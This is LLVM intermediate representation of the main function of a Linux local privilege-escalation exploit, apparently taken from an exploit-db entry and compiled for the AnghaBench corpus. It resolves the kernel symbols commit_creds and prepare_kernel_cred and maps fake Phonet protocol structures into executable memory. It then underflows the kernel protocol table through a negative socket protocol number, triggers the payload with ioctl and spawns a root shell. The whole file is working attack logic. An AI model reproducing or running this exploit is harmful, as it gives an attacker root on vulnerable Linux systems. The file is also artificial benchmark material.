; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_15944.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_15944.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.proto_ops_skel = type { i32*, i32 }
%struct.phonet_protocol_skel = type { i8*, i8*, i32 }

@.str = private unnamed_addr constant [49 x i8] c"[*] Testing Phonet support and CAP_SYS_ADMIN...\0A\00", align 1
@PF_PHONET = common dso_local global i32 0, align 4
@SOCK_DGRAM = common dso_local global i32 0, align 4
@errno = common dso_local global i64 0, align 8
@EPERM = common dso_local global i64 0, align 8
@.str.1 = private unnamed_addr constant [35 x i8] c"[*] You don't have CAP_SYS_ADMIN.\0A\00", align 1
@.str.2 = private unnamed_addr constant [35 x i8] c"[*] Failed to open Phonet socket.\0A\00", align 1
@.str.3 = private unnamed_addr constant [33 x i8] c"[*] Resolving kernel symbols...\0A\00", align 1
@.str.4 = private unnamed_addr constant [10 x i8] c"proto_tab\00", align 1
@SYM_NAME = common dso_local global i8* null, align 8
@SYM_OFFSET = common dso_local global i64 0, align 8
@.str.5 = private unnamed_addr constant [9 x i8] c"pn_proto\00", align 1
@.str.6 = private unnamed_addr constant [13 x i8] c"commit_creds\00", align 1
@commit_creds = common dso_local global i8* null, align 8
@.str.7 = private unnamed_addr constant [20 x i8] c"prepare_kernel_cred\00", align 1
@prepare_kernel_cred = common dso_local global i8* null, align 8
@.str.8 = private unnamed_addr constant [39 x i8] c"[*] Failed to resolve kernel symbols.\0A\00", align 1
@.str.9 = private unnamed_addr constant [64 x i8] c"[*] %s is mapped higher than prototab.  Can not underflow :-(.\0A\00", align 1
@.str.10 = private unnamed_addr constant [34 x i8] c"[*] Preparing fake structures...\0A\00", align 1
@getroot = common dso_local global i32 0, align 4
@AF_PHONET = common dso_local global i32 0, align 4
@.str.11 = private unnamed_addr constant [25 x i8] c"[*] Copying Structures.\0A\00", align 1
@SYM_ADDRESS = common dso_local global i64 0, align 8
@PROT_READ = common dso_local global i32 0, align 4
@PROT_WRITE = common dso_local global i32 0, align 4
@PROT_EXEC = common dso_local global i32 0, align 4
@MAP_PRIVATE = common dso_local global i32 0, align 4
@MAP_ANONYMOUS = common dso_local global i32 0, align 4
@MAP_FAILED = common dso_local global i8* null, align 8
@.str.12 = private unnamed_addr constant [33 x i8] c"[*] Failed to map landing area.\0A\00", align 1
@.str.13 = private unnamed_addr constant [5 x i8] c"mmap\00", align 1
@.str.14 = private unnamed_addr constant [33 x i8] c"[*] Underflowing with offset %d\0A\00", align 1
@.str.15 = private unnamed_addr constant [27 x i8] c"[*] Underflow failed :-(.\0A\00", align 1
@.str.16 = private unnamed_addr constant [29 x i8] c"[*] Elevating privlidges...\0A\00", align 1
@.str.17 = private unnamed_addr constant [33 x i8] c"[*] Exploit failed to get root.\0A\00", align 1
@.str.18 = private unnamed_addr constant [65 x i8] c"[*] This was a triumph... I'm making a note here, huge success.\0A\00", align 1
@.str.19 = private unnamed_addr constant [8 x i8] c"/bin/sh\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i64, align 8
  %9 = alloca i64, align 8
  %10 = alloca i64, align 8
  %11 = alloca i8*, align 8
  %12 = alloca %struct.proto_ops_skel, align 8
  %13 = alloca %struct.phonet_protocol_skel, align 8
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %14 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([49 x i8], [49 x i8]* @.str, i64 0, i64 0))
  %15 = load i32, i32* @PF_PHONET, align 4
  %16 = load i32, i32* @SOCK_DGRAM, align 4
  %17 = call i32 @socket(i32 %15, i32 %16, i32 0)
  store i32 %17, i32* %6, align 4
  %18 = load i32, i32* %6, align 4
  %19 = icmp slt i32 %18, 0
  br i1 %19, label %20, label %29

20:                                               ; preds = %2
  %21 = load i64, i64* @errno, align 8
  %22 = load i64, i64* @EPERM, align 8
  %23 = icmp eq i64 %21, %22
  br i1 %23, label %24, label %26

24:                                               ; preds = %20
  %25 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([35 x i8], [35 x i8]* @.str.1, i64 0, i64 0))
  br label %28

26:                                               ; preds = %20
  %27 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([35 x i8], [35 x i8]* @.str.2, i64 0, i64 0))
  br label %28

28:                                               ; preds = %26, %24
  store i32 -1, i32* %3, align 4
  br label %125

29:                                               ; preds = %2
  %30 = load i32, i32* %6, align 4
  %31 = call i32 @close(i32 %30)
  %32 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.3, i64 0, i64 0))
  %33 = call i64 @get_kernel_sym(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.4, i64 0, i64 0))
  store i64 %33, i64* %8, align 8
  %34 = load i8*, i8** @SYM_NAME, align 8
  %35 = call i64 @get_kernel_sym(i8* %34)
  %36 = load i64, i64* @SYM_OFFSET, align 8
  %37 = add i64 %35, %36
  store i64 %37, i64* %9, align 8
  %38 = call i64 @get_kernel_sym(i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.5, i64 0, i64 0))
  store i64 %38, i64* %10, align 8
  %39 = call i64 @get_kernel_sym(i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.6, i64 0, i64 0))
  %40 = inttoptr i64 %39 to i8*
  store i8* %40, i8** @commit_creds, align 8
  %41 = call i64 @get_kernel_sym(i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.7, i64 0, i64 0))
  %42 = inttoptr i64 %41 to i8*
  store i8* %42, i8** @prepare_kernel_cred, align 8
  %43 = load i64, i64* %8, align 8
  %44 = icmp ne i64 %43, 0
  br i1 %44, label %45, label %51

45:                                               ; preds = %29
  %46 = load i8*, i8** @commit_creds, align 8
  %47 = icmp ne i8* %46, null
  br i1 %47, label %48, label %51

48:                                               ; preds = %45
  %49 = load i8*, i8** @prepare_kernel_cred, align 8
  %50 = icmp ne i8* %49, null
  br i1 %50, label %53, label %51

51:                                               ; preds = %48, %45, %29
  %52 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([39 x i8], [39 x i8]* @.str.8, i64 0, i64 0))
  store i32 -1, i32* %3, align 4
  br label %125

53:                                               ; preds = %48
  %54 = load i64, i64* %9, align 8
  %55 = load i64, i64* %8, align 8
  %56 = icmp uge i64 %54, %55
  br i1 %56, label %57, label %60

57:                                               ; preds = %53
  %58 = load i8*, i8** @SYM_NAME, align 8
  %59 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([64 x i8], [64 x i8]* @.str.9, i64 0, i64 0), i8* %58)
  store i32 -1, i32* %3, align 4
  br label %125

60:                                               ; preds = %53
  %61 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([34 x i8], [34 x i8]* @.str.10, i64 0, i64 0))
  %62 = getelementptr inbounds %struct.proto_ops_skel, %struct.proto_ops_skel* %12, i32 0, i32 0
  store i32* @getroot, i32** %62, align 8
  %63 = getelementptr inbounds %struct.proto_ops_skel, %struct.proto_ops_skel* %12, i32 0, i32 1
  %64 = load i32, i32* @AF_PHONET, align 4
  store i32 %64, i32* %63, align 8
  %65 = getelementptr inbounds %struct.phonet_protocol_skel, %struct.phonet_protocol_skel* %13, i32 0, i32 0
  %66 = bitcast %struct.proto_ops_skel* %12 to i8*
  store i8* %66, i8** %65, align 8
  %67 = getelementptr inbounds %struct.phonet_protocol_skel, %struct.phonet_protocol_skel* %13, i32 0, i32 1
  %68 = load i64, i64* %10, align 8
  %69 = inttoptr i64 %68 to i8*
  store i8* %69, i8** %67, align 8
  %70 = getelementptr inbounds %struct.phonet_protocol_skel, %struct.phonet_protocol_skel* %13, i32 0, i32 2
  %71 = load i32, i32* @SOCK_DGRAM, align 4
  store i32 %71, i32* %70, align 8
  %72 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([25 x i8], [25 x i8]* @.str.11, i64 0, i64 0))
  %73 = load i64, i64* @SYM_ADDRESS, align 8
  %74 = inttoptr i64 %73 to i8*
  %75 = load i32, i32* @PROT_READ, align 4
  %76 = load i32, i32* @PROT_WRITE, align 4
  %77 = or i32 %75, %76
  %78 = load i32, i32* @PROT_EXEC, align 4
  %79 = or i32 %77, %78
  %80 = load i32, i32* @MAP_PRIVATE, align 4
  %81 = load i32, i32* @MAP_ANONYMOUS, align 4
  %82 = or i32 %80, %81
  %83 = call i8* @mmap(i8* %74, i32 4096, i32 %79, i32 %82, i32 -1, i32 0)
  store i8* %83, i8** %11, align 8
  %84 = load i8*, i8** %11, align 8
  %85 = load i8*, i8** @MAP_FAILED, align 8
  %86 = icmp eq i8* %84, %85
  br i1 %86, label %87, label %90

87:                                               ; preds = %60
  %88 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.12, i64 0, i64 0))
  %89 = call i32 @perror(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.13, i64 0, i64 0))
  store i32 -1, i32* %3, align 4
  br label %125

90:                                               ; preds = %60
  %91 = load i64, i64* @SYM_ADDRESS, align 8
  %92 = inttoptr i64 %91 to i8*
  %93 = call i32 @memcpy(i8* %92, %struct.phonet_protocol_skel* %13, i32 24)
  %94 = load i64, i64* %8, align 8
  %95 = load i64, i64* %9, align 8
  %96 = sub i64 %94, %95
  %97 = udiv i64 %96, 8
  %98 = sub i64 0, %97
  %99 = trunc i64 %98 to i32
  store i32 %99, i32* %7, align 4
  %100 = load i32, i32* %7, align 4
  %101 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.14, i64 0, i64 0), i32 %100)
  %102 = load i32, i32* @PF_PHONET, align 4
  %103 = load i32, i32* @SOCK_DGRAM, align 4
  %104 = load i32, i32* %7, align 4
  %105 = call i32 @socket(i32 %102, i32 %103, i32 %104)
  store i32 %105, i32* %6, align 4
  %106 = load i32, i32* %6, align 4
  %107 = icmp slt i32 %106, 0
  br i1 %107, label %108, label %110

108:                                              ; preds = %90
  %109 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.15, i64 0, i64 0))
  store i32 -1, i32* %3, align 4
  br label %125

110:                                              ; preds = %90
  %111 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([29 x i8], [29 x i8]* @.str.16, i64 0, i64 0))
  %112 = load i32, i32* %6, align 4
  %113 = call i32 @ioctl(i32 %112, i32 0, i32* null)
  %114 = call i64 (...) @getuid()
  %115 = icmp ne i64 %114, 0
  br i1 %115, label %116, label %118

116:                                              ; preds = %110
  %117 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.17, i64 0, i64 0))
  store i32 -1, i32* %3, align 4
  br label %125

118:                                              ; preds = %110
  %119 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([65 x i8], [65 x i8]* @.str.18, i64 0, i64 0))
  %120 = call i32 @execl(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.19, i64 0, i64 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.19, i64 0, i64 0), i32* null)
  %121 = load i32, i32* %6, align 4
  %122 = call i32 @close(i32 %121)
  %123 = load i8*, i8** %11, align 8
  %124 = call i32 @munmap(i8* %123, i32 4096)
  store i32 0, i32* %3, align 4
  br label %125

125:                                              ; preds = %118, %116, %108, %87, %57, %51, %28
  %126 = load i32, i32* %3, align 4
  ret i32 %126
}

declare dso_local i32 @printf(i8*, ...) #1

declare dso_local i32 @socket(i32, i32, i32) #1

declare dso_local i32 @close(i32) #1

declare dso_local i64 @get_kernel_sym(i8*) #1

declare dso_local i8* @mmap(i8*, i32, i32, i32, i32, i32) #1

declare dso_local i32 @perror(i8*) #1

declare dso_local i32 @memcpy(i8*, %struct.phonet_protocol_skel*, i32) #1

declare dso_local i32 @ioctl(i32, i32, i32*) #1

declare dso_local i64 @getuid(...) #1

declare dso_local i32 @execl(i8*, i8*, i32*) #1

declare dso_local i32 @munmap(i8*, i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
